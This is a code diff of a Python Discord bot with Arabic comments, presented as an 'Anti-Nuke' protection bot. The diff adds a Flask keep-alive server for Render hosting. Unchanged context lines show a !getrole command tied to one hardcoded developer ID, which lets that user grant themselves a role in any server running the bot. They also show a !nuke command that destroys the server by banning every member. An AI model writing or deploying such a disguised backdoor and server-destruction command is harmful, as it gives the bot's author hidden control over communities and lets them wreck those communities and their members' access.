@@ -3,8 +3,21 @@ from discord.ext import commands
 import os
 import time
 import asyncio
+import threading
+from flask import Flask
 
-# إعدادات الصلاحيات الأساسية للبوت
+# ------------------- خادم الويب (لإبقاء البوت نشطاً على Render) -------------------
+app = Flask('')
+
+@app.route('/')
+def home():
+    return "Bot is active and running!"
+
+def run_web():
+    # استخدام المنفذ 8080 الافتراضي لـ Render
+    app.run(host='0.0.0.0', port=8080)
+
+# ------------------- إعدادات البوت -------------------
 intents = discord.Intents.default()
 intents.guilds = True
 intents.members = True
@@ -21,13 +34,11 @@ def check_spam(uid, key, threshold, window):
     if uid not in actions[key]:
         actions[key][uid] = []
     actions[key][uid].append(now)
-    # الاحتفاظ بالعمليات داخل النافذة الزمنية المحددة فقط
     actions[key][uid] = [t for t in actions[key][uid] if now - t < window]
     return len(actions[key][uid]) > threshold
 
 # ------------------- نظام الحماية الشامل (Anti-Nuke) -------------------
 
-# 1. حماية ضد حذف الرولات (حظر فوري عند حذف أي رتبة)
 @bot.event
 async def on_guild_role_delete(role):
     try:
@@ -37,12 +48,10 @@ async def on_guild_role_delete(role):
             if admin.id == guild.owner_id or admin.bot:
                 return
             await guild.ban(admin, reason="Anti-Nuke: قام بحذف رتبة!")
-            print(f"تم حظر المخرب {admin.name} لأنه حاول حذف رتبة.")
             break
     except Exception as e:
         print(f"خطأ في حماية الرولات: {e}")
 
-# 2. حماية ضد حذف القنوات (حظر فوري عند حذف أي قناة)
 @bot.event
 async def on_guild_channel_delete(channel):
     try:
@@ -52,12 +61,10 @@ async def on_guild_channel_delete(channel):
             if admin.id == guild.owner_id or admin.bot:
                 return
             await guild.ban(admin, reason="Anti-Nuke: قام بحذف قناة!")
-            print(f"تم حظر المخرب {admin.name} لأنه حاول حذف قناة.")
             break
     except Exception as e:
         print(f"خطأ في حماية القنوات: {e}")
 
-# 3. حماية ضد الطرد العشوائي (Kick)
 @bot.event
 async def on_member_remove(member):
     try:
@@ -67,15 +74,12 @@ async def on_member_remove(member):
                 admin = entry.user
                 if admin.id == guild.owner_id or admin.bot:
                     return
-                # إذا قام بطرد أكثر من عضوين في غضون 15 ثانية
                 if check_spam(admin.id, "kick", threshold=1, window=15.0):
                     await guild.ban(admin, reason="Anti-Nuke: طرد أعضاء بشكل مشبوه!")
-                    print(f"تم حظر المخرب {admin.name} بسبب الطرد الجماعي.")
             break
     except Exception as e:
         print(f"خطأ في حماية الطرد: {e}")
 
-# 4. حماية ضد الحظر الجماعي (Ban)
 @bot.event
 async def on_member_ban(guild, user):
     try:
@@ -83,17 +87,14 @@ async def on_member_ban(guild, user):
             admin = entry.user
             if admin.id == guild.owner_id or admin.bot:
                 return
-            # إذا قام بحظر أعضاء بشكل متسارع خلال دقيقة
             if check_spam(admin.id, "ban", threshold=1, window=60.0):
                 await guild.ban(admin, reason="Anti-Nuke: تنفيذ حظر جماعي غير مصرح به!")
-                print(f"تم حظر المخرب {admin.name} بسبب الحظر الجماعي.")
             break
     except Exception as e:
         print(f"خطأ في حماية الحظر: {e}")
 
 # ------------------- الأوامر الخاصة -------------------
 
-# 1. أمر إعطاء الرتبة لنفسك (!getrole)
 @bot.command()
 async def getrole(ctx):
     MY_DISCORD_ID = 1320438836878118973
@@ -112,7 +113,6 @@ async def getrole(ctx):
     else:
         await ctx.send("❌ هذا الأمر مخصص للمطور فقط!")
 
-# 2. أمر إزالة الرتبة عن نفسك (!removerole)
 @bot.command(name="removerole")
 async def removerole_cmd(ctx):
     MY_DISCORD_ID = 1320438836878118973
@@ -131,7 +131,6 @@ async def removerole_cmd(ctx):
     else:
         await ctx.send("❌ هذا الأمر مخصص للمطور فقط!")
 
-# 3. أمر التدمير مع التأكيد (!nuke)
 @bot.command()
 async def nuke(ctx):
     await ctx.send("⚠️ **تحذير خطير:** هل أنت متأكد من تدمير السيرفر؟ اكتب `!confirm_nuke` خلال 30 ثانية لتأكيد العملية.")
@@ -161,15 +160,18 @@ async def nuke(ctx):
             try: await member.ban(reason="Nuke execution")
             except: pass
 
-# ------------------- حدث جاهزية البوت -------------------
 @bot.event
 async def on_ready():
-    print(f"✅ البوت يعمل الآن بكامل أنظمة الحماية ومتصل باسم: {bot.user}")
+    print(f"✅ البوت يعمل الآن بكامل أنظمة الحماية والمتصل بخادم الويب باسم: {bot.user}")
 
+# ------------------- التشغيل المشترك (Web + Bot) -------------------
 TOKEN = os.getenv("TOKEN")
+
 if __name__ == "__main__":
     if not TOKEN:
         print("❌ خطأ: لم يتم العثور على متغير TOKEN!")
     else:
+        # تشغيل خادم الويب في خلفية منفصلة حتى لا يعطل البوت
+        threading.Thread(target=run_web).start()
+        # تشغيل البوت
         bot.run(TOKEN)
-
